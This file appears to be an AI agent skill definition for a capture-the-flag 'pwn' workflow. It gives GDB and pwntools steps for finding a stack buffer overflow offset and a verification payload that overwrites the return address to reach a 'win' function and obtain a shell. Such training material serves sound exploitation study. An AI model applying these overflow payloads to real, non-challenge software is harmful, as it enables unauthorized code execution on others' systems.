---
name: pwn-dynamic
description: Run dynamic analysis phase - GDB debugging, cyclic offset, crash analysis
argument-hint: "<binary>"
allowed-tools: ["Bash", "Read", "Write"]
---

# PWN Dynamic - Dynamic Analysis

Perform dynamic analysis to verify findings and calculate exact exploitation offsets.

## Execution Steps

### Step 1: Generate Cyclic Pattern

```bash
python3 -c "from pwn import *; print(cyclic(200).decode())"
```

Save pattern to file for GDB input:

```bash
python3 -c "from pwn import *; open('/tmp/pattern', 'wb').write(cyclic(200))"
```

### Step 2: Run Binary with Pattern in GDB

Create a GDB command file:

```bash
cat > /tmp/pwn-debug.gdb << 'EOF'
set disable-randomization on
run < /tmp/pattern
EOF
```

Run GDB:

```bash
gdb -q -x /tmp/pwn-debug.gdb <binary>
```

### Step 3: Analyze Crash

After crash, in GDB (pwndbg):

```
# Check what value is at RSP (return address location)
x/gx $rsp

# Find offset
cyclic -l <value_at_rsp>

# Or for 32-bit
cyclic -l $eip
```

### Step 4: Verify Offset

Test with calculated offset:

```bash
python3 << 'EOF'
from pwn import *
offset = 72  # Replace with calculated offset
payload = b'A' * offset + p64(0xdeadbeef)
open('/tmp/verify', 'wb').write(payload)
EOF
```

Run in GDB and verify RIP/EIP is 0xdeadbeef.

### Step 5: Generate Project .gdbinit

Create `.gdbinit` for the challenge:

```gdb
# Challenge-specific GDB config for pwndbg
set disable-randomization on
file ./binary

# Useful breakpoints
b main
# b *vuln+<offset_to_ret>

# Commands on stop
define hook-stop
    telescope $rsp 8
end

# Helper commands
define pwn-check
    checksec
    vmmap
    got
end
```

### Step 6: Document Register Control

From crash analysis, document:
- Which registers are controlled
- Stack state at crash
- Any useful values on stack (canary leaks, addresses)

## Output Format

```
## Dynamic Analysis

### Findings
- Offset to RIP: 72 bytes (verified)
- RSP control: Full (can place ROP chain)
- Register state at crash:
  - RAX: 0x0 (return from gets)
  - RBX: 0x0
  - RDI: Points to buffer
- Stack contains: No useful leaks observed

### Debug Session
```
Program received signal SIGSEGV
RSP: 0x7fffffffe4a8 → 'haaaiaaaj...'

pwndbg> cyclic -l 0x6161616861616169
Finding cyclic pattern of 8 bytes: b'iaaaaaha' (hex: 0x6161616861616169)
Found at offset 72
```

### Verification
```python
# Test payload
from pwn import *
io = process('./binary')
payload = b'A' * 72 + p64(0x401234)  # win address
io.sendline(payload)
io.interactive()
# Result: Shell obtained / flag printed
```

### Generated Files
- `.gdbinit` - Project-specific GDB config

### Next Steps
1. Build final exploit with correct offset
2. Add stack alignment if needed (ret gadget)
3. Test locally then adapt for remote
```
